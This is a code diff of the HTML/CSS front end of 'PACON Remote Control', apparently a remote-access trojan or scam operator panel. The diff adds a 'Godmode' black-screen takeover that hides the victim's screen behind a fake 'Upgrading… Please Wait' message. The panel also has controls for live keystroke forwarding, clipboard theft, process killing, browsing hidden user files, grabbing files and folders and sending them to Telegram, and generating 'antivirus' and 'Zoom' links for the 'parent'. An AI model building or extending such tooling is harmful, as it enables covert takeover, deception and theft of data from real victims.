@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🛡️ PACON Remote Control v1.2.11</title>
+<title>🛡️ PACON Remote Control v1.2.12 — Godmode</title>
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
 <style>
@@ -11,23 +11,26 @@
     --bg-primary: #0d1117; --bg-secondary: #161b22; --bg-panel: #1c2128;
     --border: #30363d; --text-primary: #e6edf3; --text-secondary: #8b949e;
     --accent: #238636; --blue: #1f6feb; --purple: #8957e5;
-    --red: #da3633; --orange: #d29922;
+    --red: #da3633; --orange: #d29922; --pink: #db61a2;
 }
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
     background: var(--bg-primary); color: var(--text-primary);
-    font-family: 'Segoe UI', system-ui, sans-serif;
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
     overflow: hidden; height: 100vh;
 }
 ::-webkit-scrollbar { width: 6px; height: 6px; }
 ::-webkit-scrollbar-track { background: transparent; }
 ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: #484f58; }
 @media (prefers-reduced-motion: reduce) {
     *, *::before, *::after {
         animation-duration: 0.001s !important;
         transition-duration: 0.001s !important;
     }
 }
+
+/* ===== PIN GATE ===== */
 #pinGate {
     position: fixed; inset: 0; z-index: 10000;
     background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
@@ -59,11 +62,12 @@ body {
     color: white; font-size: 15px; font-weight: 600; border-radius: 8px;
     cursor: pointer; transition: all 0.15s;
 }
-#pinSubmit:hover { background: #388bfd; transform: translateY(-1px); }
+#pinSubmit:hover:not(:disabled) { background: #388bfd; transform: translateY(-1px); }
 #pinSubmit:disabled { background: var(--border); cursor: not-allowed; transform: none; opacity: 0.6; }
 #pinError { color: var(--red); font-size: 12px; margin-top: 16px; min-height: 18px; }
 #pinHint { color: var(--text-secondary); font-size: 11px; margin-top: 20px; }
 
+/* ===== HEADER ===== */
 .rc-header {
     height: 48px; background: var(--bg-secondary);
     border-bottom: 1px solid var(--border);
@@ -71,11 +75,17 @@ body {
 }
 .rc-header .brand { font-weight: 700; font-size: 14px; display: flex; align-items: center; gap: 8px; }
 .rc-header .brand i { color: var(--blue); font-size: 18px; }
+.rc-header .brand .ver-badge {
+    font-size: 9px; font-weight: 600; padding: 2px 6px;
+    background: rgba(137, 87, 229, 0.15); color: var(--purple);
+    border-radius: 4px; margin-left: 4px;
+}
 .rc-header .device-select {
     background: var(--bg-panel); border: 1px solid var(--border);
     color: var(--text-primary); padding: 5px 12px; border-radius: 6px;
     font-size: 12px; min-width: 280px; cursor: pointer; outline: none;
 }
+.rc-header .device-select:focus { border-color: var(--blue); }
 .rc-header .status-pill {
     margin-left: auto; display: flex; align-items: center; gap: 8px;
     padding: 5px 12px; border-radius: 20px; background: var(--bg-panel);
@@ -92,11 +102,15 @@ body {
     background: transparent; border: 1px solid var(--border);
     color: var(--text-secondary); padding: 5px 10px; border-radius: 6px;
     font-size: 12px; cursor: pointer; transition: all 0.15s;
+    display: inline-flex; align-items: center; gap: 5px; white-space: nowrap;
 }
 .rc-header .header-btn:hover { background: var(--bg-panel); color: var(--text-primary); }
 .rc-header .header-btn.active { background: var(--accent); color: white; border-color: var(--accent); }
 
+/* ===== BODY ===== */
 .rc-body { display: flex; height: calc(100vh - 48px); overflow: hidden; }
+
+/* ===== LEFT SIDEBAR ===== */
 .rc-sidebar-left {
     width: 220px; background: var(--bg-secondary);
     border-right: 1px solid var(--border);
@@ -143,6 +157,7 @@ body {
     font-size: 9px; color: var(--text-secondary); margin-top: 3px;
 }
 
+/* ===== SCREEN AREA ===== */
 .rc-screen-area {
     flex: 1; background: #000;
     display: flex; align-items: center; justify-content: center;
@@ -213,6 +228,7 @@ body {
 .touch-indicator.right { background: rgba(218, 54, 51, 0.4); border-color: var(--red); }
 .touch-indicator.double { background: rgba(137, 87, 229, 0.5); border-color: var(--purple); }
 
+/* ===== RIGHT SIDEBAR ===== */
 .rc-sidebar-right {
     width: 320px; background: var(--bg-secondary);
     border-left: 1px solid var(--border); padding: 12px;
@@ -239,6 +255,14 @@ body {
 .btn-ctrl.danger:hover { background: var(--red); border-color: var(--red); }
 .btn-ctrl.warning:hover { background: var(--orange); border-color: var(--orange); }
 .btn-ctrl.success:hover { background: var(--accent); border-color: var(--accent); }
+.btn-ctrl.godmode {
+    background: linear-gradient(135deg, rgba(137, 87, 229, 0.15), rgba(219, 97, 162, 0.15));
+    border: 1px solid var(--purple); color: #d2a8ff;
+}
+.btn-ctrl.godmode:hover {
+    background: linear-gradient(135deg, var(--purple), var(--pink));
+    border-color: var(--pink); color: white;
+}
 .btn-ctrl.key { font-family: 'Consolas', monospace; font-size: 10px; padding: 6px 4px; min-height: 32px; }
 .btn-ctrl:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
 
@@ -305,7 +329,7 @@ body {
 .breadcrumb-trail .sep { color: var(--text-secondary); }
 
 .file-toolbar {
-    display: flex; gap: 4px; margin-bottom: 6px;
+    display: flex; gap: 4px; margin-bottom: 6px; flex-wrap: wrap;
 }
 .file-toolbar button {
     background: var(--bg-secondary); border: 1px solid var(--border);
@@ -321,9 +345,11 @@ body {
     white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
 }
 .file-item:hover { background: var(--bg-secondary); }
-.file-item i { width: 14px; text-align: center; }
-.file-item .size { margin-left: auto; color: var(--text-secondary); font-size: 9px; }
+.file-item i { width: 14px; text-align: center; flex-shrink: 0; }
+.file-item .file-name { flex: 1; overflow: hidden; text-overflow: ellipsis; }
+.file-item .size { color: var(--text-secondary); font-size: 9px; flex-shrink: 0; }
 
+/* ===== LOG ===== */
 .rc-log {
     position: fixed; bottom: 0; left: 220px; right: 320px;
     background: rgba(13, 17, 23, 0.95);
@@ -346,16 +372,17 @@ body {
     border-radius: 6px; font-size: 10px; cursor: pointer; z-index: 31;
 }
 
+/* ===== TOASTS ===== */
 #toastContainer {
     position: fixed; top: 60px; right: 20px;
     z-index: 9999; display: flex; flex-direction: column; gap: 8px;
-    pointer-events: none;
+    pointer-events: none; max-width: 420px;
 }
 .toast {
     background: var(--bg-panel); border: 1px solid var(--border);
     border-radius: 8px; padding: 10px 16px;
     font-size: 12px; color: var(--text-primary);
-    min-width: 240px; max-width: 400px;
+    min-width: 240px;
     box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     display: flex; align-items: center; gap: 10px;
     pointer-events: auto;
@@ -365,7 +392,7 @@ body {
 .toast.error { border-left: 3px solid var(--red); }
 .toast.warn { border-left: 3px solid var(--orange); }
 .toast.info { border-left: 3px solid var(--blue); }
-.toast i { font-size: 14px; }
+.toast i { font-size: 14px; flex-shrink: 0; }
 .toast.success i { color: var(--accent); }
 .toast.error i { color: var(--red); }
 .toast.warn i { color: var(--orange); }
@@ -375,6 +402,7 @@ body {
     to { opacity: 1; transform: translateX(0); }
 }
 
+/* ===== STICKY DEVICE ===== */
 .sticky-device {
     position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%);
     background: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
@@ -390,6 +418,7 @@ body {
 .sticky-device.offline .dot { background: var(--red); box-shadow: 0 0 6px var(--red); }
 .sticky-device.pending .dot { background: var(--orange); box-shadow: 0 0 6px var(--orange); }
 
+/* ===== TELEGRAM / MISC ===== */
 .tg-input {
     background: var(--bg-secondary); border: 1px solid var(--border);
     color: var(--text-primary); padding: 6px 8px;
@@ -414,10 +443,27 @@ body {
 .agent-info .row .val.pending { color: var(--orange); }
 .agent-info .row .val.online { color: #3fb950; }
 .agent-info .row .val.offline { color: #f85149; }
+
+/* ===== GODMODE BADGE ===== */
+.godmode-active-banner {
+    position: absolute; top: 12px; left: 50%; transform: translateX(-50%);
+    background: linear-gradient(135deg, var(--purple), var(--pink));
+    color: white; padding: 6px 18px; border-radius: 20px;
+    font-size: 12px; font-weight: 700; letter-spacing: 1px;
+    z-index: 16; box-shadow: 0 0 24px rgba(137, 87, 229, 0.7);
+    display: none; align-items: center; gap: 8px;
+    animation: godmodePulse 1.6s ease-in-out infinite;
+}
+.godmode-active-banner.show { display: flex; }
+@keyframes godmodePulse {
+    0%, 100% { box-shadow: 0 0 24px rgba(137, 87, 229, 0.7); }
+    50% { box-shadow: 0 0 36px rgba(219, 97, 162, 0.9); }
+}
 </style>
 </head>
 <body>
 
+<!-- ===== PIN GATE ===== -->
 <div id="pinGate" class="hidden">
     <div class="pin-card">
         <div class="pin-icon"><i class="fas fa-shield-alt"></i></div>
@@ -437,32 +483,36 @@ body {
     </div>
 </div>
 
+<!-- ===== HEADER ===== -->
 <div class="rc-header">
     <div class="brand">
         <i class="fas fa-shield-alt"></i>
-        <span>PACON Remote Control v1.2.11</span>
+        <span>PACON Remote Control</span>
+        <span class="ver-badge">v1.2.12</span>
     </div>
-    <select class="device-select" id="deviceSelect" onchange="rcSelectDevice(this.value)">
+    <select class="device-select" id="deviceSelect">
         <option value="">-- Select Device --</option>
     </select>
-    <button class="header-btn" onclick="rcRefreshDevices()" title="Refresh devices"><i class="fas fa-sync"></i></button>
-    <button class="header-btn" id="btnRefreshScreen" onclick="rcToggleAutoRefresh()" title="Toggle auto-refresh">
+    <button class="header-btn" id="btnRefreshDevices" title="Refresh devices"><i class="fas fa-sync"></i></button>
+    <button class="header-btn" id="btnToggleAuto" title="Toggle auto-refresh">
         <i class="fas fa-pause"></i> <span id="refreshLabel">Auto</span>
     </button>
-    <button class="header-btn" onclick="rcForceScreenshot()" title="Force screenshot"><i class="fas fa-camera"></i></button>
-    <button class="header-btn" id="btnLiveTyping" onclick="rcToggleLiveTyping()" title="Forward your real keyboard to the focused window">
+    <button class="header-btn" id="btnForceShot" title="Force screenshot"><i class="fas fa-camera"></i></button>
+    <button class="header-btn" id="btnLiveTyping" title="Forward your real keyboard to the focused window">
         <i class="fas fa-keyboard"></i> <span id="liveTypingLabel">Live Typing OFF</span>
     </button>
-    <button class="header-btn" onclick="rcShowDiagnostics()" title="Diagnostics"><i class="fas fa-stethoscope"></i></button>
-    <button class="header-btn" onclick="rcLogout()" title="Lock dashboard"><i class="fas fa-lock"></i></button>
+    <button class="header-btn" id="btnDiagnostics" title="Diagnostics"><i class="fas fa-stethoscope"></i></button>
+    <button class="header-btn" id="btnLogout" title="Lock dashboard"><i class="fas fa-lock"></i></button>
     <div class="status-pill offline" id="statusPill">
         <div class="dot"></div>
         <span id="statusText">Disconnected</span>
     </div>
 </div>
 
+<!-- ===== BODY ===== -->
 <div class="rc-body">
 
+    <!-- LEFT SIDEBAR -->
     <div class="rc-sidebar-left">
         <div>
             <div class="sidebar-section-title">Devices</div>
@@ -472,32 +522,36 @@ body {
         </div>
         <div>
             <div class="sidebar-section-title">Quick Actions</div>
-            <div class="menu-item" id="qmi-screenshot" onclick="rcKey('screenshot')"><i class="fas fa-camera"></i> Snapshot</div>
-            <div class="menu-item" id="qmi-wake" onclick="rcKey('wake')"><i class="fas fa-sun"></i> Wake Screen</div>
-            <div class="menu-item" id="qmi-lock" onclick="rcKey('lock')"><i class="fas fa-lock"></i> Lock Screen</div>
-            <div class="menu-item" id="qmi-notifications" onclick="rcKey('notifications')"><i class="fas fa-bell"></i> Notifications</div>
+            <div class="menu-item" data-action="screenshot"><i class="fas fa-camera"></i> Snapshot</div>
+            <div class="menu-item" data-action="wake"><i class="fas fa-sun"></i> Wake Screen</div>
+            <div class="menu-item" data-action="lock"><i class="fas fa-lock"></i> Lock Screen</div>
+            <div class="menu-item" data-action="notifications"><i class="fas fa-bell"></i> Notifications</div>
         </div>
         <div>
             <div class="sidebar-section-title">Session</div>
-            <div class="menu-item" onclick="rcRefreshScreen()"><i class="fas fa-redo"></i> Refresh</div>
-            <div class="menu-item" onclick="rcClearLog()"><i class="fas fa-eraser"></i> Clear Log</div>
-            <div class="menu-item" onclick="rcShowShortcuts()"><i class="fas fa-keyboard"></i> Shortcuts</div>
-            <div class="menu-item" onclick="rcLogout()"><i class="fas fa-sign-out-alt"></i> Lock</div>
+            <div class="menu-item" id="miRefresh"><i class="fas fa-redo"></i> Refresh</div>
+            <div class="menu-item" id="miClearLog"><i class="fas fa-eraser"></i> Clear Log</div>
+            <div class="menu-item" id="miShortcuts"><i class="fas fa-keyboard"></i> Shortcuts</div>
+            <div class="menu-item" id="miLock"><i class="fas fa-sign-out-alt"></i> Lock</div>
         </div>
     </div>
 
+    <!-- SCREEN -->
     <div class="rc-screen-area">
         <div class="rc-screen-wrapper" id="screenWrapper">
             <img id="screenImg" alt="Device screen" />
             <div id="screenOverlay"></div>
+            <div class="godmode-active-banner" id="godmodeBanner">
+                <i class="fas fa-skull"></i> BLACK SCREEN ACTIVE
+            </div>
             <div class="rc-screen-loading" id="screenLoading">
                 <div class="spinner-ring"></div>
                 <div style="font-size: 12px; color: var(--text-secondary);" id="screenLoadingText">Waiting for screen...</div>
             </div>
             <div class="zoom-controls">
-                <button onclick="rcZoom(-1)" title="Zoom out"><i class="fas fa-search-minus"></i></button>
-                <button onclick="rcZoom(0)" title="Reset zoom"><i class="fas fa-compress"></i></button>
-                <button onclick="rcZoom(1)" title="Zoom in"><i class="fas fa-search-plus"></i></button>
+                <button id="btnZoomOut" title="Zoom out"><i class="fas fa-search-minus"></i></button>
+                <button id="btnZoomReset" title="Reset zoom"><i class="fas fa-compress"></i></button>
+                <button id="btnZoomIn" title="Zoom in"><i class="fas fa-search-plus"></i></button>
             </div>
             <div class="screen-info-bar" id="screenInfoBar" style="display: none;">
                 <span class="badge" id="fpsBadge">0 FPS</span>
@@ -506,125 +560,151 @@ body {
         </div>
     </div>
 
+    <!-- RIGHT SIDEBAR -->
     <div class="rc-sidebar-right">
 
+                <!-- Navigation -->
         <div class="control-panel">
             <h6><i class="fas fa-gamepad"></i> Navigation</h6>
             <div class="btn-grid">
-                <button class="btn-ctrl" onclick="rcKey('back')"><i class="fas fa-arrow-left"></i> Back</button>
-                <button class="btn-ctrl" onclick="rcKey('home')"><i class="fas fa-house"></i> Home</button>
-                <button class="btn-ctrl" onclick="rcKey('recents')"><i class="fas fa-list"></i> Recents</button>
-                <button class="btn-ctrl" onclick="rcKey('notifications')"><i class="fas fa-bell"></i> Shade</button>
-                <button class="btn-ctrl warning" onclick="rcKey('wake')"><i class="fas fa-sun"></i> Wake</button>
-                <button class="btn-ctrl danger" onclick="rcKey('lock')"><i class="fas fa-lock"></i> Lock</button>
+                <button class="btn-ctrl" data-cmd="key" data-key="back"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn-ctrl" data-cmd="key" data-key="home"><i class="fas fa-house"></i> Home</button>
+                <button class="btn-ctrl" data-cmd="key" data-key="recents"><i class="fas fa-list"></i> Recents</button>
+                <button class="btn-ctrl" data-cmd="key" data-key="notifications"><i class="fas fa-bell"></i> Shade</button>
+                <button class="btn-ctrl warning" data-cmd="key" data-key="wake"><i class="fas fa-sun"></i> Wake</button>
+                <button class="btn-ctrl danger" data-cmd="key" data-key="lock"><i class="fas fa-lock"></i> Lock</button>
             </div>
         </div>
 
+        <!-- GODMODE — Black Screen Takeover -->
+        <div class="control-panel" id="godmodePanel">
+            <h6><i class="fas fa-skull"></i> Godmode — Screen Takeover</h6>
+            <div style="display:flex;flex-direction:column;gap:8px;">
+                <input type="text" class="tg-input" id="bsMessage"
+                       placeholder="Overlay message (default: Upgrading… Please Wait)"
+                       value="Upgrading…  Please Wait" />
+                <button class="btn-ctrl godmode" id="btnBlackscreen"
+                        style="width:100%;font-size:12px;padding:10px;">
+                    <i class="fas fa-moon"></i> Deploy Black Screen
+                </button>
+                <button class="btn-ctrl success" id="btnUnblackscreen"
+                        style="width:100%;font-size:12px;padding:10px;">
+                    <i class="fas fa-sun"></i> Lift Black Screen
+                </button>
+                <div id="bsStatus" style="font-size:10px;color:var(--text-secondary);text-align:center;">
+                    Overlay: <span id="bsStatusVal" style="color:#8b949e;font-weight:600;">unknown</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Keyboard Shortcuts -->
         <div class="control-panel">
             <h6><i class="fas fa-keyboard"></i> Keyboard Shortcuts</h6>
             <div class="btn-grid triple">
-                <button class="btn-ctrl key" onclick="rcHotkey('ctrl+c')">Ctrl+C</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('ctrl+v')">Ctrl+V</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('ctrl+x')">Ctrl+X</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('ctrl+z')">Ctrl+Z</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('ctrl+a')">Ctrl+A</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('ctrl+s')">Ctrl+S</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('alt+tab')">Alt+Tab</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('alt+f4')">Alt+F4</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('esc')">Esc</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('tab')">Tab</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('enter')">Enter</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('ctrl+shift+esc')">Task Mgr</button>
+                <button class="btn-ctrl key" data-hotkey="ctrl+c">Ctrl+C</button>
+                <button class="btn-ctrl key" data-hotkey="ctrl+v">Ctrl+V</button>
+                <button class="btn-ctrl key" data-hotkey="ctrl+x">Ctrl+X</button>
+                <button class="btn-ctrl key" data-hotkey="ctrl+z">Ctrl+Z</button>
+                <button class="btn-ctrl key" data-hotkey="ctrl+a">Ctrl+A</button>
+                <button class="btn-ctrl key" data-hotkey="ctrl+s">Ctrl+S</button>
+                <button class="btn-ctrl key" data-hotkey="alt+tab">Alt+Tab</button>
+                <button class="btn-ctrl key" data-hotkey="alt+f4">Alt+F4</button>
+                <button class="btn-ctrl key" data-hotkey="esc">Esc</button>
+                <button class="btn-ctrl key" data-hotkey="tab">Tab</button>
+                <button class="btn-ctrl key" data-hotkey="enter">Enter</button>
+                <button class="btn-ctrl key" data-hotkey="ctrl+shift+esc">Task Mgr</button>
             </div>
             <div class="btn-grid" style="margin-top:6px;">
-                <button class="btn-ctrl key" onclick="rcHotkey('win+d')">Win+D</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('win+e')">Win+E</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('win+r')">Win+R</button>
-                <button class="btn-ctrl key" onclick="rcHotkey('win+l')">Win+L</button>
+                <button class="btn-ctrl key" data-hotkey="win+d">Win+D</button>
+                <button class="btn-ctrl key" data-hotkey="win+e">Win+E</button>
+                <button class="btn-ctrl key" data-hotkey="win+r">Win+R</button>
+                <button class="btn-ctrl key" data-hotkey="win+l">Win+L</button>
             </div>
         </div>
 
+        <!-- Text Input -->
         <div class="control-panel">
             <h6><i class="fas fa-font"></i> Text Input</h6>
             <div class="text-input-group">
                 <input type="text" id="rcTextInput" placeholder="Type text..." />
-                <button onclick="rcSendText()" title="Send"><i class="fas fa-paper-plane"></i></button>
+                <button id="btnSendText" title="Send"><i class="fas fa-paper-plane"></i></button>
             </div>
             <div style="margin-top: 8px; display: flex; gap: 6px;">
-                <button class="btn-ctrl" style="flex: 1;" onclick="rcKey('backspace')"><i class="fas fa-delete-left"></i> Backspace</button>
-                <button class="btn-ctrl danger" style="flex: 1;" onclick="rcClearText()"><i class="fas fa-eraser"></i> Clear</button>
+                <button class="btn-ctrl" style="flex: 1;" data-cmd="key" data-key="backspace"><i class="fas fa-delete-left"></i> Backspace</button>
+                <button class="btn-ctrl danger" style="flex: 1;" id="btnClearText"><i class="fas fa-eraser"></i> Clear</button>
             </div>
             <div style="margin-top: 6px; display: flex; gap: 6px;">
-                <button class="btn-ctrl key" style="flex: 1;" onclick="rcHotkey('enter')">Enter ⏎</button>
-                <button class="btn-ctrl key" style="flex: 1;" onclick="rcHotkey('tab')">Tab ⇥</button>
-                <button class="btn-ctrl key" style="flex: 1;" onclick="rcHotkey('esc')">Esc</button>
+                <button class="btn-ctrl key" style="flex: 1;" data-hotkey="enter">Enter ⏎</button>
+                <button class="btn-ctrl key" style="flex: 1;" data-hotkey="tab">Tab ⇥</button>
+                <button class="btn-ctrl key" style="flex: 1;" data-hotkey="esc">Esc</button>
             </div>
         </div>
 
+        <!-- Power / Godmode extras -->
         <div class="control-panel">
-            <h6><i class="fas fa-bolt"></i> Godmode</h6>
+            <h6><i class="fas fa-bolt"></i> Power &amp; Process</h6>
             <div class="btn-grid">
-                <button class="btn-ctrl" onclick="rcClipboardGet()"><i class="fas fa-clipboard"></i> Get Clip</button>
-                <button class="btn-ctrl" onclick="rcClipboardSet()"><i class="fas fa-paste"></i> Set Clip</button>
-                <button class="btn-ctrl warning" onclick="rcPower('logoff')"><i class="fas fa-sign-out-alt"></i> Logoff</button>
-                <button class="btn-ctrl warning" onclick="rcPower('sleep')"><i class="fas fa-moon"></i> Sleep</button>
-                <button class="btn-ctrl danger" onclick="rcPower('restart')"><i class="fas fa-redo"></i> Restart</button>
-                <button class="btn-ctrl danger" onclick="rcPower('shutdown')"><i class="fas fa-power-off"></i> Shutdown</button>
+                <button class="btn-ctrl" id="btnClipGet"><i class="fas fa-clipboard"></i> Get Clip</button>
+                <button class="btn-ctrl" id="btnClipSet"><i class="fas fa-paste"></i> Set Clip</button>
+                <button class="btn-ctrl warning" data-power="logoff"><i class="fas fa-sign-out-alt"></i> Logoff</button>
+                <button class="btn-ctrl warning" data-power="sleep"><i class="fas fa-moon"></i> Sleep</button>
+                <button class="btn-ctrl danger" data-power="restart"><i class="fas fa-redo"></i> Restart</button>
+                <button class="btn-ctrl danger" data-power="shutdown"><i class="fas fa-power-off"></i> Shutdown</button>
             </div>
             <div class="text-input-group" style="margin-top:8px;">
                 <input type="text" id="rcKillInput" placeholder="Kill process (e.g. chrome.exe)" />
-                <button onclick="rcKillProcess()" title="Kill"><i class="fas fa-skull"></i></button>
+                <button id="btnKill" title="Kill"><i class="fas fa-skull"></i></button>
             </div>
+        </div>
 
-            <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);">
-                <div style="font-size:10px;font-weight:700;color:var(--text-secondary);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;">
-                    <i class="fas fa-link"></i> Generate Links
-                </div>
-                <div class="btn-grid">
-                    <button class="btn-ctrl success" onclick="rcGenerateZoomLink()" title="Generate Zoom call link for parent">
-                        <i class="fas fa-video"></i> Zoom Link
+        <!-- Link Generators -->
+        <div class="control-panel">
+            <h6><i class="fas fa-link"></i> Generate Links</h6>
+            <div class="btn-grid">
+                <button class="btn-ctrl success" id="btnZoomLink" title="Generate Zoom call link">
+                    <i class="fas fa-video"></i> Zoom Link
+                </button>
+                <button class="btn-ctrl success" id="btnAvLink" title="Generate antivirus download link">
+                    <i class="fas fa-shield-virus"></i> Antivirus Link
+                </button>
+            </div>
+            <div id="rcLinkOutput" style="display:none;margin-top:8px;padding:8px 10px;background:var(--bg-secondary);border:1px solid var(--border);border-radius:6px;font-family:'Consolas',monospace;font-size:10px;word-break:break-all;">
+                <div style="color:var(--text-secondary);font-size:9px;margin-bottom:4px;" id="rcLinkLabel">Link:</div>
+                <a id="rcLinkAnchor" href="#" target="_blank" rel="noopener" style="color:#79c0ff;text-decoration:none;">—</a>
+                <div style="display:flex;gap:4px;margin-top:6px;">
+                    <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" id="btnCopyLink">
+                        <i class="fas fa-copy"></i> Copy
                     </button>
-                    <button class="btn-ctrl success" onclick="rcGenerateAntivirusLink()" title="Generate antivirus download link for parent">
-                        <i class="fas fa-shield-virus"></i> Antivirus Link
+                    <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" id="btnOpenLink">
+                        <i class="fas fa-external-link-alt"></i> Open
                     </button>
-                </div>
-                <div id="rcLinkOutput" style="display:none;margin-top:8px;padding:8px 10px;background:var(--bg-secondary);border:1px solid var(--border);border-radius:6px;font-family:'Consolas',monospace;font-size:10px;word-break:break-all;">
-                    <div style="color:var(--text-secondary);font-size:9px;margin-bottom:4px;" id="rcLinkLabel">Link:</div>
-                    <a id="rcLinkAnchor" href="#" target="_blank" rel="noopener" style="color:#79c0ff;text-decoration:none;">—</a>
-                    <div style="display:flex;gap:4px;margin-top:6px;">
-                        <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" onclick="rcCopyLinkOutput()">
-                            <i class="fas fa-copy"></i> Copy
-                        </button>
-                        <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" onclick="rcOpenLinkOutput()">
-                            <i class="fas fa-external-link-alt"></i> Open
-                        </button>
-                        <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" onclick="rcSendLinkTelegram()">
-                            <i class="fab fa-telegram"></i> TG
-                        </button>
-                        <button class="btn-ctrl danger" style="flex:1;font-size:9px;padding:3px 6px;" onclick="document.getElementById('rcLinkOutput').style.display='none'">
-                            <i class="fas fa-times"></i>
-                        </button>
-                    </div>
+                    <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" id="btnSendLinkTg">
+                        <i class="fab fa-telegram"></i> TG
+                    </button>
+                    <button class="btn-ctrl danger" style="flex:1;font-size:9px;padding:3px 6px;" id="btnHideLink">
+                        <i class="fas fa-times"></i>
+                    </button>
                 </div>
             </div>
         </div>
 
+        <!-- File Browser -->
         <div class="control-panel">
             <h6><i class="fas fa-folder-open"></i> File Browser</h6>
             <div class="breadcrumb-trail" id="rcBreadcrumb">
                 <span style="color:var(--text-secondary);font-size:10px;">No path yet</span>
             </div>
             <div class="file-toolbar">
-                <button onclick="rcQuickPath('C:\\\\Users')" title="Users"><i class="fas fa-users"></i> Users</button>
-                <button onclick="rcQuickPath('C:\\\\')" title="C:\"><i class="fas fa-hdd"></i> C:\</button>
-                <button onclick="rcQuickPath('%USERPROFILE%\\\\Desktop')" title="Desktop"><i class="fas fa-desktop"></i> Desktop</button>
-                <button id="rcHiddenToggle" onclick="rcToggleHidden()" title="Show hidden files"><i class="fas fa-eye-slash"></i></button>
-                <button onclick="rcFetchFolderAndTg()" title="Grab current folder &amp; send all to Telegram"><i class="fab fa-telegram"></i> TG</button>
-                <button onclick="rcFileUp()" title="Go up"><i class="fas fa-arrow-up"></i></button>
+                <button data-quickpath="C:\Users" title="Users"><i class="fas fa-users"></i> Users</button>
+                <button data-quickpath="C:\" title="C:\"><i class="fas fa-hdd"></i> C:\</button>
+                <button data-quickpath="%USERPROFILE%\Desktop" title="Desktop"><i class="fas fa-desktop"></i> Desktop</button>
+                <button id="rcHiddenToggle" title="Show hidden files"><i class="fas fa-eye-slash"></i></button>
+                <button id="btnFetchFolderTg" title="Grab current folder &amp; send all to Telegram"><i class="fab fa-telegram"></i> TG</button>
+                <button id="rcFileUp" title="Go up"><i class="fas fa-arrow-up"></i></button>
             </div>
             <div class="text-input-group">
-                <input type="text" id="rcPathInput" placeholder="C:\Users\..." onkeydown="if(event.key==='Enter')rcListDir()" />
-                <button onclick="rcListDir()" title="Browse"><i class="fas fa-search"></i></button>
+                <input type="text" id="rcPathInput" placeholder="C:\Users\..." />
+                <button id="rcListDirBtn" title="Browse"><i class="fas fa-search"></i></button>
             </div>
             <div id="rcFileList" style="max-height:220px;overflow-y:auto;margin-top:8px;background:var(--bg-secondary);border-radius:6px;padding:4px;">
                 <div style="color:var(--text-secondary);font-size:10px;padding:8px;text-align:center;">
@@ -633,46 +713,47 @@ body {
             </div>
         </div>
 
+        <!-- Received Files -->
         <div class="control-panel">
             <h6>
                 <i class="fas fa-inbox"></i> Received Files
-                <button class="btn-ctrl" style="margin-left: auto; padding: 2px 8px; font-size: 10px;"
-                        onclick="rcLoadReceivedFiles(true)" title="Refresh">
+                <button class="btn-ctrl" style="margin-left: auto; padding: 2px 8px; font-size: 10px;" id="btnRefreshReceived" title="Refresh">
                     <i class="fas fa-sync"></i> Refresh
                 </button>
             </h6>
             <div class="file-toolbar">
-                <button onclick="rcFetchFilePrompt()" title="Grab a specific file from the child">
+                <button id="btnFetchFilePrompt" title="Grab a specific file from the child">
                     <i class="fas fa-download"></i> Grab File
                 </button>
-                <button onclick="rcFetchFolderPrompt()" title="Grab all files matching a pattern">
+                <button id="btnFetchFolderPrompt" title="Grab all files matching a pattern">
                     <i class="fas fa-folder-open"></i> Grab Folder
                 </button>
-                <button onclick="rcSendAllReceivedToTelegram()" title="Send every received file to Telegram">
+                <button id="btnSendAllReceivedTg" title="Send every received file to Telegram">
                     <i class="fab fa-telegram"></i> All→TG
                 </button>
             </div>
-            <div id="rcReceivedFiles" style="max-height:260px;overflow-y:auto;margin-top:8px;
-                 background:var(--bg-secondary);border-radius:6px;padding:4px;">
+            <div id="rcReceivedFiles" style="max-height:260px;overflow-y:auto;margin-top:8px;background:var(--bg-secondary);border-radius:6px;padding:4px;">
                 <div style="color:var(--text-secondary);font-size:10px;padding:8px;text-align:center;">
                     No files received yet
                 </div>
             </div>
         </div>
 
+        <!-- Apps -->
         <div class="control-panel">
             <h6>
                 <i class="fas fa-th"></i> Apps
-                <button class="btn-ctrl" style="margin-left: auto; padding: 2px 8px; font-size: 10px;" onclick="rcLoadApps(true)">
+                <button class="btn-ctrl" style="margin-left: auto; padding: 2px 8px; font-size: 10px;" id="btnRefreshApps">
                     <i class="fas fa-sync"></i>
                 </button>
             </h6>
-            <input type="text" class="app-search" id="appSearch" placeholder="Search apps..." oninput="rcFilterApps()" />
